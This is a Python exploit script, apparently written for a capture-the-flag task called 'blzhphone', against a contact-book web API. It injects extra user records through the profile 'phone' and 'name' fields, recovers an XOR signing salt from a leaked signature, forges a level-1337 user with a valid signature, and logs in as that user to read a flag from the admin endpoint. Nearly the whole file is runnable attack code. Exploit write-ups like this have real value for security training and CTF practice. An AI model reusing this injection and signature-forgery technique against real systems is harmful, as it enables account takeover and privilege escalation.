"""
Exploit for blzhphone task
1. Create a new user
2. Update "phone" and "name" fields to inject new user
3. Get signature
4. Extract salt
5. Inject new user with valid signature
"""
import argparse
import json
import logging
import random
import string
from binascii import hexlify, unhexlify
from typing import Any, Dict

import requests
from passlib.context import CryptContext

logging.basicConfig()
logger = logging.getLogger("sploit")
logger.setLevel(logging.DEBUG)

parser = argparse.ArgumentParser()
parser.add_argument("--url", type=str, default="http://localhost:8000", help="Contact book URL")
parser.add_argument("--salt-len", type=int, default=16, help="Salt length")

def check(resp: requests.Response):
    pass

def random_string(n: int = 16, alphabet: str = string.ascii_letters) -> str:
    return "".join([random.choice(alphabet) for i in range(n)])

# Taken from sss.py and modified
def sign(user: Dict[str, Any], salt: str) -> str:
    to_salt = user["username"] + user["name"] + str(user["level"]) + user["phone"]
    sign = bytes([c^salt[idx % len(salt)] for idx, c in enumerate(to_salt.encode())])
    return hexlify(sign).decode()


def login(URL: str, username: str, password: str) -> str:
    r = requests.post(f"{URL}/api/token", data={
        "username": username,
        "password": password
    })

    if r.status_code != 200:
        raise Exception("Response code is not 200", r.text)

    if not "access_token" in r.json():
        raise Exception("Can't find access token in response", r.json())

    return r.json()["access_token"]

def update(URL: str, phone: str, name: str, token: str) -> Dict[str, Any]:
    r = requests.post(f"{URL}/api/me", json={
        "phone": phone,
        "name": name
    }, headers={"Authorization": f"Bearer {token}"})

    if r.status_code != 200:
        raise Exception("Response code is not 200", r.text)

    return r.json()

def get(URL: str, token: str) -> Dict[str, Any]:
    r = requests.get(f"{URL}/api/me", headers={"Authorization": f"Bearer {token}"})

    if r.status_code != 200:
        raise Exception("Response code is not 200", r.text)

    return r.json()


def admin(URL: str, token: str) -> Dict[str, Any]:
    r = requests.get(f"{URL}/api/admin", headers={"Authorization": f"Bearer {token}"})

    if r.status_code != 200:
        raise Exception("Response code is not 200", r.text)

    return r.json()

if __name__ == "__main__":
    args = parser.parse_args()
    URL = args.url
    salt_len = args.salt_len

    username = random_string()
    username_salt = random_string()
    password = random_string()
    crypt_context = CryptContext(schemes=["bcrypt"])

    logger.info(f"Logging in as {username}:{password}")
    try:
        # 1. Create new user
        token = login(URL, username, password)
        logger.debug(f"Token: {token}")

        # 2. Update "phone" and "name" fields to inject new user
        update_data = {
            "phone": f"""test_phone\"
{username_salt}:
  password: {crypt_context.hash(password)}
  level: 1337
  phone: """"",
            "name": f"""
  name: \"{username}"""
        }

        user = {
            "username": username,
            "name": '',
            "level": 0,
            "phone": '',
        }

        logger.info("Updating user")
        u = update(URL, update_data["phone"], update_data["name"], token)
        logger.debug(f"Returned user: {u}")


        # 3. Get signature:
        #    - Login as injected user
        #    - Extract signature from "phone" field
        logger.info(f"Logging as salt user {username_salt}:{password}")
        token_salt = login(URL, username_salt, password)
        logger.debug(f"Token: {token}")

        logger.info(f"Getting user info")
        salt_user = get(URL, token_salt)
        logger.debug(f"Pwned user: {salt_user}")

        sig = salt_user["phone"].strip().split(" ")[1]
        logger.info(f"Extracted signature: {sig}")


        # 4. Compute salt = (username+name+level+phone)^signature
        salt = sign(user, unhexlify(sig))[:salt_len]
        logger.info(f"Extracted salt: {salt}")
        salt = unhexlify(salt)

        # 5. Forge and inject new user with level = 1337 and valid signature
        pwned_user = {
            "username": random_string(),
            "password": password,
            "level": 1337,
            "phone": "pwned_phone",
        }
        pwned_user["name"] = pwned_user["username"]
        pwned_user["signature"] = sign(pwned_user, salt)

        update_data = {
            "phone": f"""test_phone\"
{pwned_user['username']}:
  password: {crypt_context.hash(pwned_user['password'])}
  level: {pwned_user['level']}
  phone: {pwned_user['phone']}
  signature: {pwned_user['signature']}
  thrash: """"",
            "name": f"""
  name: \"{pwned_user['name']}"""
        }


        logger.info("================FINAL================")
        
        username = random_string()
        logger.info(f"Logging in as {username}:{password}")
        token = login(URL, username, random_string())
        logger.debug(f"New token: {token}")

        u = update(URL, update_data['phone'], update_data['name'], token)
        logger.debug(f"Returned user: {u}")

        logger.info(f"Logging as pwned user {pwned_user['username']}:{password}")
        token_pwned = login(URL, pwned_user['username'], password)
        logger.debug(f"Token: {token}")

        # 6. Get flag from /api/admin
        book = admin(URL, token_pwned)
        logger.debug(f"Book: {book}")
        for contact in book['contacts']:
            if 'flag' in contact['phone']:
                logger.info(f"FLAG: {contact['phone']}")
    except Exception as e:
        logger.exception(e)
